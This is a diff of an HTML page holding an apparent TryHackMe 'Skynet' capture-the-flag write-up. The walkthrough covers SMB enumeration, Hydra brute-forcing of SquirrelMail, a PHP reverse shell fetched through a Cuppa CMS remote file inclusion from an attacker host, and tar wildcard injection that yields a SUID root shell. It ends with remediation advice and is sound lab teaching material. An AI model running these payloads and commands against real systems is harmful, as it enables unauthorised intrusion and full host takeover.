@@ -1,103 +1,432 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Skynet — OfflineDevc Writeups</title>
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Skynet — Writeup | OfflineDevc</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
 </head>
 <body>
-
+  <!-- NAV -->
   <nav class="navbar">
-    <div class="nav-inner">
-      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
-      <div class="nav-links">
-        <a href="../index.html#about">About</a>
-        <a href="../index.html#writeups">Writeups</a>
-        <a href="../index.html#contact">Contact</a>
-      </div>
+    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">Writeups</a>
     </div>
   </nav>
 
-  <header class="writeup-hero">
-    <div class="writeup-hero-inner">
-      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
-      <div class="card-header" style="margin-bottom:12px">
-        <span class="platform thm-badge">THM</span>
-        <span class="difficulty medium-badge">Medium</span>
+  <!-- WRITEUP HEADER -->
+  <section class="writeup-hero">
+    <div class="container">
+      <div class="writeup-meta-top">
+        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
+        <span class="platform-badge thm">TryHackMe</span>
       </div>
       <h1 class="writeup-title">Skynet</h1>
-      <p style="color:#666;font-size:14px;margin-top:8px">Linux (Ubuntu) · Anonymous SMB → Log Wordlist → Hydra SquirrelMail → Miles Dyson SMB → Cuppa RFI → Tar Wildcard → Root</p>
-      <div class="meta-row">
-        <div class="meta-item">🖥 OS: <span>Linux (Ubuntu)</span></div>
-        <div class="meta-item">🎯 Target: <span><code>10.49.175.147</code></span></div>
+      <div class="writeup-badges">
+        <span class="badge diff-easy">Easy</span>
+        <span class="badge badge-os">Linux</span>
       </div>
     </div>
-  </header>
+  </section>
 
-  <article class="writeup-content">
+  <!-- WRITEUP CONTENT -->
+  <main class="writeup-body">
+    <div class="container writeup-content">
+<h1 id="skynet-tryhackme-writeup">Skynet - TryHackMe Writeup</h1>
+<hr />
+<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Room Name</strong></td>
+<td style="text-align: left;">Skynet</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Platform</strong></td>
+<td style="text-align: left;">TryHackMe</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Operating System</strong></td>
+<td style="text-align: left;">Linux (Ubuntu 16.04 LTS)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Target IP</strong></td>
+<td style="text-align: left;"><code>10.49.175.116</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Attacker IP</strong></td>
+<td style="text-align: left;"><code>192.168.132.94</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Difficulty</strong></td>
+<td style="text-align: left;">Easy / Medium</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Key Attack Vectors</strong></td>
+<td style="text-align: left;">Anonymous SMB Share (<code>attention.txt</code>, <code>log1.txt</code>), Web Directory Enumeration (SquirrelMail), Hydra Form Brute-Forcing (<code>milesdyson</code>), SMB Password Recovery via Webmail, Hidden Endpoint Discovery via SMB Share (<code>important.txt</code>), Cuppa CMS Remote File Inclusion (RFI) via <code>alertConfigField.php?urlConfig=</code>, Root Cron Job Discovery via <code>pspy64</code>, Tar Wildcard Injection SUID Rootbash Exploitation</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113191434.png" /></p>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<pre><code>Recon (Nmap Full Scan):
+  ↓  Ports: 22 (SSH), 80 (Apache), 110 (POP3), 139/445 (Samba), 143 (IMAP)
+SMB Null Session Enumeration:
+  ↓  Shares: print$, anonymous, milesdyson, IPC$
+  ↓  anonymous share → attention.txt, logs/log1.txt (wordlist)
+Web Enumeration:
+  ↓  http://10.49.175.116/ (Skynet Search page)
+  ↓  Gobuster → /squirrelmail/ (SquirrelMail 1.4.23)
+SquirrelMail Brute-Force (Hydra):
+  ↓  hydra -l milesdyson -P log1.txt ... → milesdyson : ********
+  ↓  Read email: &quot;Samba Password reset&quot; → [REDACTED]
+SMB Access to milesdyson Share:
+  ↓  smbclient //10.49.175.116/milesdyson -U milesdyson (Password: ********)
+  ↓  notes/important.txt → Beta CMS endpoint: /45kra24zxs28v3yd/
+Web Directory Busting on Hidden Endpoint:
+  ↓  Gobuster on /45kra24zxs28v3yd/ → /administrator/ (Cuppa CMS)
+Initial Foothold (Cuppa CMS RFI):
+  ↓  Created phpreverse.php on attacker port 8000
+  ↓  Triggered RFI via alerts/alertConfigField.php?urlConfig=http://192.168.132.94:8000/phpreverse.php
+  ↓  Penelope listener (4444) receives shell as www-data
+  ↓  User flag: cat /home/milesdyson/user.txt → ********************************
+Privilege Escalation (Tar Wildcard SUID Rootbash):
+  ↓  cat /home/milesdyson/backups/backup.sh → tar cf ... * inside /var/www/html
+  ↓  pspy64 confirms backup.sh runs every minute as UID=0 (root)
+  ↓  In /var/www/html: created shell.sh (cp /bin/bash rootbash &amp;&amp; chmod +s rootbash)
+  ↓  touch -- '--checkpoint=1' &amp;&amp; touch -- '--checkpoint-action=exec=sh shell.sh'
+  ↓  Cron runs tar, triggering shell.sh as root → /var/www/html/rootbash (SUID)
+  ↓  Root flag: /var/www/html/rootbash -p -c 'cat /root/root.txt' → ********************************
+</code></pre>
+<hr />
+<h2 id="2-phase-1-reconnaissance-smb-enumeration">2. Phase 1: Reconnaissance &amp; SMB Enumeration</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
+<p>We run an Nmap script and version scan against <code>10.49.175.116</code>:</p>
+<pre><code class="language-bash">nmap -sT -sV -sC 10.49.175.116 -Pn
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105210328.png" /></p>
+<p><strong>Identified Ports:</strong><br />
+- <strong>Port 22/tcp</strong>: OpenSSH 7.2p2 Ubuntu<br />
+- <strong>Port 80/tcp</strong>: Apache httpd 2.4.18 (Ubuntu) — Title: <code>Skynet</code><br />
+- <strong>Port 110/tcp</strong>: Dovecot pop3d<br />
+- <strong>Port 139/tcp / 445/tcp</strong>: Samba smbd 4.3.11-Ubuntu (Workgroup: <code>WORKGROUP</code>)<br />
+- <strong>Port 143/tcp</strong>: Dovecot imapd</p>
+<h3 id="22-smb-share-discovery">2.2 SMB Share Discovery</h3>
+<p>We list available shares using a null session:</p>
+<pre><code class="language-bash">smbclient -L //10.49.175.116 -N
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105210401.png" /></p>
+<p><strong>Discovered Shares:</strong><br />
+- <code>print$</code> (Printer Drivers)<br />
+- <code>anonymous</code> (Skynet Anonymous Share)<br />
+- <code>milesdyson</code> (Miles Dyson Personal Share)<br />
+- <code>IPC$</code> (IPC Service)</p>
+<h3 id="23-accessing-the-anonymous-smb-share">2.3 Accessing the Anonymous SMB Share</h3>
+<p>We connect to the <code>anonymous</code> share without authentication:</p>
+<pre><code class="language-bash">smbclient //10.49.175.116/anonymous -N
+smb: \&gt; ls
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105210440.png" /></p>
+<p>We download <code>attention.txt</code> and check the <code>logs</code> folder:</p>
+<pre><code class="language-bash">smb: \&gt; get attention.txt
+smb: \&gt; cd logs
+smb: \logs\&gt; ls
+smb: \logs\&gt; get log1.txt
+smb: \logs\&gt; get log2.txt
+smb: \logs\&gt; get log3.txt
+smb: \logs\&gt; exit
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105210956.png" /></p>
+<p>The file <code>log1.txt</code> contains a wordlist of passwords, while <code>log2.txt</code> and <code>log3.txt</code> are empty (0 bytes).</p>
+<hr />
+<h2 id="3-phase-2-web-enumeration-initial-foothold">3. Phase 2: Web Enumeration &amp; Initial Foothold</h2>
+<h3 id="31-web-portal-directory-busting">3.1 Web Portal &amp; Directory Busting</h3>
+<p>Visiting <code>http://10.49.175.116/</code> in the browser reveals the default Skynet search engine page:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105211112.png" /></p>
+<p>We perform initial directory busting using <code>directory-list-2.3-small.txt</code>:</p>
+<pre><code class="language-bash">gobuster dir -u http://10.49.175.116/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,sh,bak,txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105211537.png" /></p>
+<p>We then perform a scan with <code>common.txt</code>:</p>
+<pre><code class="language-bash">gobuster dir -u http://10.49.175.116/ -w /usr/share/wordlists/dirb/common.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105212016.png" /></p>
+<p><strong>Discovered Paths:</strong><br />
+- <code>/admin</code> (Status: 301)<br />
+- <code>/config</code> (Status: 301)<br />
+- <code>/css</code> (Status: 301)<br />
+- <code>/js</code> (Status: 301)<br />
+- <code>/squirrelmail</code> (Status: 301) <code>--&gt; http://10.49.175.116/squirrelmail/</code></p>
+<h3 id="32-squirrelmail-login-interface">3.2 SquirrelMail Login Interface</h3>
+<p>Browsing to <code>http://10.49.175.116/squirrelmail/src/login.php</code> displays the <strong>SquirrelMail version 1.4.23 [SVN]</strong> login form:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105212046.png" /></p>
+<h3 id="33-brute-forcing-squirrelmail-via-hydra">3.3 Brute-Forcing SquirrelMail via Hydra</h3>
+<p>Using the username <code>milesdyson</code> and the password list <code>log1.txt</code> retrieved from the anonymous SMB share, we brute-force the SquirrelMail login:</p>
+<pre><code class="language-bash">hydra -l milesdyson -P log1.txt http-post-form://10.49.175.116/squirrelmail/src/redirect.php:'login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:F=incorrect'
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105212937.png" /></p>
+<p><strong>Hydra Result:</strong></p>
+<pre><code class="language-text">[80][http-post-form] host: 10.49.175.116   login: milesdyson   password: [REDACTED]
+1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+<blockquote>
+<p><strong>SquirrelMail Credentials:</strong> <code>milesdyson</code> : <code>********</code></p>
+</blockquote>
+<h3 id="34-extracting-smb-credentials-from-webmail">3.4 Extracting SMB Credentials from Webmail</h3>
+<p>We authenticate to SquirrelMail at <code>http://10.49.175.116/squirrelmail/src/webmail.php</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105213001.png" /></p>
+<p>Inside the INBOX, we find an email from <code>skynet@skynet</code> with the subject <em>"Samba Password reset"</em>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105213017.png" /></p>
+<pre><code class="language-text">Subject: Samba Password reset
+From: skynet@skynet
+Date: Tue, September 17, 2019 9:10 pm
 
-    <table class="info-table">
-      <tr><th>Room Name</th><td>Skynet</td></tr>
-      <tr><th>Platform</th><td>TryHackMe</td></tr>
-      <tr><th>OS</th><td>Linux (Ubuntu)</td></tr>
-      <tr><th>Target IP</th><td>10.49.175.147</td></tr>
-      <tr><th>Difficulty</th><td>Medium</td></tr>
-      <tr><th>Key Techniques</th><td>Anonymous SMB, Hydra SquirrelMail, Cuppa CMS RFI, Tar Wildcard SUID</td></tr>
-    </table>
+We have changed your smb password after system malfunction.
+Password: [REDACTED]
+</code></pre>
+<blockquote>
+<p><strong>Miles Dyson SMB Password:</strong> <code>********</code></p>
+</blockquote>
+<h3 id="35-accessing-milesdyson-smb-share-discovering-hidden-directory">3.5 Accessing <code>milesdyson</code> SMB Share &amp; Discovering Hidden Directory</h3>
+<p>Using the newly recovered password, we connect to the <code>milesdyson</code> SMB share:</p>
+<pre><code class="language-bash">smbclient //10.49.175.116/milesdyson -U milesdyson
+# Password: [REDACTED]
+smb: \&gt; ls
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105213148.png" /></p>
+<p>We navigate into the <code>notes</code> directory:</p>
+<pre><code class="language-bash">smb: \&gt; cd notes
+smb: \notes\&gt; ls
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105213211.png" /></p>
+<p>We download and inspect <code>important.txt</code>:</p>
+<pre><code class="language-bash">cat important.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105213249.png" /></p>
+<pre><code class="language-text">1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+</code></pre>
+<h3 id="36-exploring-the-beta-cms-endpoint">3.6 Exploring the Beta CMS Endpoint</h3>
+<p>We navigate to <code>http://10.49.175.116/45kra24zxs28v3yd/</code> in the browser, showing <strong>Miles Dyson Personal Page</strong>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105213313.png" /></p>
+<p>We run Gobuster on this hidden path:</p>
+<pre><code class="language-bash">gobuster dir -u http://10.49.175.116/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105213450.png" /></p>
+<p>Gobuster identifies <code>/administrator/</code> (Status: 301). Navigating to <code>http://10.49.175.116/45kra24zxs28v3yd/administrator/</code> presents the <strong>Cuppa CMS</strong> login page:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105213509.png" /></p>
+<p>We initially attempt brute-forcing Cuppa CMS login with <code>milesdyson</code> and <code>admin</code> using <code>rockyou.txt</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105214754.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261105214800.png" /></p>
+<p>Both brute-force attempts are aborted upon discovering a known Remote File Inclusion (RFI) vulnerability in Cuppa CMS.</p>
+<hr />
+<h2 id="4-phase-3-exploiting-cuppa-cms-rfi-user-access">4. Phase 3: Exploiting Cuppa CMS RFI &amp; User Access</h2>
+<h3 id="41-cuppa-cms-remote-file-inclusion-rfi">4.1 Cuppa CMS Remote File Inclusion (RFI)</h3>
+<p>Researching Cuppa CMS vulnerabilities reveals that <code>alerts/alertConfigField.php</code> improperly includes the remote file specified by the <code>urlConfig</code> parameter:</p>
+<pre><code class="language-text">/alerts/alertConfigField.php?urlConfig=&lt;URL&gt;
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105215723.png" /></p>
+<h3 id="42-setting-up-listener-hosting-php-reverse-shell">4.2 Setting Up Listener &amp; Hosting PHP Reverse Shell</h3>
+<p>We start a listener on our attacker machine:</p>
+<pre><code class="language-bash">penelope nc -p 4444
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105215733.png" /></p>
+<p>We create a PHP reverse shell script named <code>phpreverse.php</code> targeting <code>192.168.132.94:4444</code>:</p>
+<pre><code class="language-bash">nano phpreverse.php
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105215933.png" /></p>
+<pre><code class="language-php">&lt;?php
+// Reverse-shell callback for an authorized lab only.
+// Replace ATTACKER_VPN_IP with an address reachable from the target.
+$host = '192.168.132.94';
+$port = 4444;
+$sock = @fsockopen($host, $port, $errno, $errstr, 5);
+if (!$sock) {
+    http_response_code(500);
+    exit(&quot;connect failed: $errno\n&quot;);
+}
+$spec = [0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock];
+$proc = @proc_open('/bin/sh -i', $spec, $pipes);
+if (is_resource($proc)) {
+    proc_close($proc);
+}
+fclose($sock);
+?&gt;
+</code></pre>
+<p>We host <code>phpreverse.php</code> with Python HTTP server on port 8000:</p>
+<pre><code class="language-bash">python3 -m http.server 8000
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105215959.png" /></p>
+<h3 id="43-triggering-the-exploit">4.3 Triggering the Exploit</h3>
+<p>We request the vulnerable endpoint in the browser:</p>
+<pre><code class="language-text">http://10.49.175.116/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.132.94:8000/phpreverse.php
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105220130.png" /></p>
+<p>Penelope receives the incoming shell connection:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105220151.png" /></p>
+<pre><code class="language-text">[New Reverse Shell] =&gt; skynet 10.49.175.116 Linux-x86_64  www-data(33)
+www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator/alerts$
+</code></pre>
+<h3 id="44-user-flag">4.4 User Flag</h3>
+<p>We read the user flag located in <code>/home/milesdyson/</code>:</p>
+<pre><code class="language-bash">www-data@skynet:/home/milesdyson$ cat user.txt
+********************************
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105220356.png" /></p>
+<blockquote>
+<p>🚩 <strong>User Flag:</strong> <code>********************************</code></p>
+</blockquote>
+<hr />
+<h2 id="5-phase-4-privilege-escalation-to-root">5. Phase 4: Privilege Escalation to Root</h2>
+<h3 id="51-analyzing-the-backup-cron-script">5.1 Analyzing the Backup Cron Script</h3>
+<p>In <code>/home/milesdyson/backups</code>, we examine <code>backup.sh</code>:</p>
+<pre><code class="language-bash">www-data@skynet:/home/milesdyson/backups$ cat backup.sh
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105220449.png" /></p>
+<pre><code class="language-bash">#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+</code></pre>
+<p>The script navigates to <code>/var/www/html</code> and executes <code>tar cf ... *</code>. Using the wildcard <code>*</code> with <code>tar</code> is susceptible to <strong>Tar Wildcard Command Injection</strong>.</p>
+<h3 id="52-process-snooping-with-pspy64">5.2 Process Snooping with <code>pspy64</code></h3>
+<p>To confirm whether <code>backup.sh</code> is triggered automatically by root, we download and execute <code>pspy64</code>:</p>
+<pre><code class="language-bash">cd /tmp
+wget http://192.168.132.94:8000/pspy64
+chmod +x pspy64
+./pspy64
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105221622.png" /></p>
+<p><code>pspy64</code> captures the scheduled execution by root (<code>UID=0</code>):</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105221607.png" /></p>
+<pre><code class="language-text">2026/11/05 09:15:01 CMD: UID=0 PID=3197 | tar cf /home/milesdyson/backups/backup.tgz 45kra24zxs28v3yd admin ai config css image.png index.html js style.css
+2026/11/05 09:15:01 CMD: UID=0 PID=3196 | /bin/bash /home/milesdyson/backups/backup.sh
+2026/11/05 09:15:01 CMD: UID=0 PID=3195 | /bin/sh -c /home/milesdyson/backups/backup.sh
+2026/11/05 09:15:01 CMD: UID=0 PID=3194 | /usr/sbin/CRON -f
+</code></pre>
+<h3 id="53-exploiting-tar-wildcard-to-create-suid-rootbash">5.3 Exploiting Tar Wildcard to Create SUID Rootbash</h3>
+<p>Since <code>www-data</code> has write permissions in <code>/var/www/html</code>, we leverage <code>tar</code>'s <code>--checkpoint</code> and <code>--checkpoint-action</code> command-line flags by creating files named after these arguments:</p>
+<pre><code class="language-bash">cd /var/www/html
+cat &gt; shell.sh &lt;&lt;'EOF'
+#!/bin/sh
+cp /bin/bash rootbash &amp;&amp; chmod +s rootbash
+EOF
 
-    <h2>// Attack Chain</h2>
-    <div class="attack-chain">Recon (Nmap)
-  → Port 80 (Apache) · Port 110/143 (IMAP) · Port 139/445 (SMB)
-  → smbclient -N → anonymous share
-  → attention.txt + log1.txt (password wordlist)
-  → Gobuster → /squirrelmail
-  → Hydra HTTP POST → milesdyson : ████████
-  → Webmail INBOX → email from skynet → Samba password: [REDACTED]
-  → smbclient → milesdyson share → important.txt → hidden dir
-  → Gobuster on /45kra24zxs28v3yd → /administrator (Cuppa CMS)
-  → Cuppa CMS RFI: ?urlConfig=http://attacker/phpreverse.php
-  → Shell as www-data
-  → /home/milesdyson/user.txt → ████████████████████████████████
-  → pspy64 → cron: cd /var/www/html && tar cf /home/milesdyson/backups/backup.tgz *
-  → tar wildcard injection → --checkpoint=1 --checkpoint-action=exec=sh shell.sh
-  → chmod u+s /bin/bash → /bin/bash -p → root
-  → /var/www/html/rootbash -p -c "cat /root/root.txt" → ████████████████████████████████</div>
+chmod 700 shell.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+ls -la -- shell.sh '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh'
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105223125.png" /></p>
+<p>When the cron job runs, <code>tar</code> expands <code>*</code> to include <code>--checkpoint=1</code> and <code>--checkpoint-action=exec=sh shell.sh</code>. Tar interprets these arguments as options and executes <code>shell.sh</code> under root privileges.</p>
+<h3 id="54-root-verification-flag-capture">5.4 Root Verification &amp; Flag Capture</h3>
+<p>Within one minute, <code>rootbash</code> is created with SUID permissions:</p>
+<pre><code class="language-bash">www-data@skynet:/var/www/html$ stat -c '%A %a %U:%G %n' /var/www/html/rootbash
+-rwsr-sr-x 6755 root:root /var/www/html/rootbash
 
-    <h2>// Methodology</h2>
-    <p>This writeup follows the standard penetration testing lifecycle:
-    <strong>Reconnaissance</strong> → <strong>Enumeration</strong> → <strong>Exploitation</strong> →
-    <strong>Post-Exploitation</strong> → <strong>Privilege Escalation</strong> → <strong>Remediation</strong>.</p>
-    <p style="color:#555;font-size:13px;margin-top:12px">
-      📸 Full screenshot evidence is available in the original report.
-      Sensitive flags and credentials are redacted in compliance with TryHackMe guidelines.
-    </p>
+www-data@skynet:/var/www/html$ /var/www/html/rootbash -p -c 'whoami'
+root
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105223301.png" /></p>
+<p>We read the root flag using the SUID root shell:</p>
+<pre><code class="language-bash">www-data@skynet:/var/www/html$ /var/www/html/rootbash -p -c 'cat /root/root.txt'
+********************************
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261105223322.png" /></p>
+<blockquote>
+<p>🚩 <strong>Root Flag:</strong> <code>********************************</code></p>
+</blockquote>
+<hr />
+<h2 id="6-security-mitigations-remediation">6. Security Mitigations &amp; Remediation</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Vulnerability / Misconfiguration</th>
+<th style="text-align: left;">Impact</th>
+<th style="text-align: left;">Recommended Remediation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Anonymous SMB Access</strong></td>
+<td style="text-align: left;">Information leakage of internal wordlists (<code>log1.txt</code>) and security alerts.</td>
+<td style="text-align: left;">Disable guest/anonymous access in Samba configuration (<code>map to guest = Never</code>).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Plaintext Password in Email</strong></td>
+<td style="text-align: left;">Full compromise of <code>milesdyson</code> SMB share and internal documentation.</td>
+<td style="text-align: left;">Never transmit plain passwords in unencrypted communications; enforce multi-factor authentication (MFA).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Cuppa CMS Remote File Inclusion (RFI)</strong></td>
+<td style="text-align: left;">Arbitrary PHP code execution resulting in remote shell as <code>www-data</code>.</td>
+<td style="text-align: left;">Remove obsolete applications, disable <code>allow_url_include</code> in <code>php.ini</code>, and sanitize file inclusion paths.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Tar Wildcard Expansion in Root Cron</strong></td>
+<td style="text-align: left;">Arbitrary command execution leading to full root compromise.</td>
+<td style="text-align: left;">Avoid using wildcards (<code>*</code>) with <code>tar</code> in cron scripts; specify explicit paths or use <code>--</code> to delimit options.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-tools-used">7. Tools Used</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Tool</th>
+<th style="text-align: left;">Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Nmap</strong></td>
+<td style="text-align: left;">Initial port and service enumeration</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>smbclient</strong></td>
+<td style="text-align: left;">Anonymous and authenticated SMB share access</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Gobuster</strong></td>
+<td style="text-align: left;">Web directory and hidden path discovery</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Hydra</strong></td>
+<td style="text-align: left;">SquirrelMail HTTP POST brute-force authentication</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Penelope</strong></td>
+<td style="text-align: left;">Reverse shell listener</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Python HTTP Server</strong></td>
+<td style="text-align: left;">Hosting the PHP reverse shell payload</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>pspy64</strong></td>
+<td style="text-align: left;">Unprivileged Linux process and cron snooping</td>
+</tr>
+</tbody>
+</table>
+    </div>
+  </main>
 
-    <h2>// Tools Used</h2>
-    <ul style="color:#888;font-size:13px;line-height:2.2;margin-left:20px">
-      <li><code>Nmap</code></li>
-      <li><code>smbclient</code></li>
-      <li><code>Gobuster</code></li>
-      <li><code>Hydra</code></li>
-      <li><code>pspy64</code></li>
-      <li><code>Penelope</code></li>
-    </ul>
-
-  </article>
-
+  <!-- FOOTER -->
   <footer class="footer">
-    <div class="footer-inner">
-      <div class="footer-links">
-        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
-        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
-        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
-        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
-      </div>
-      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
-    </div>
+    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
   </footer>
-
 </body>
 </html>
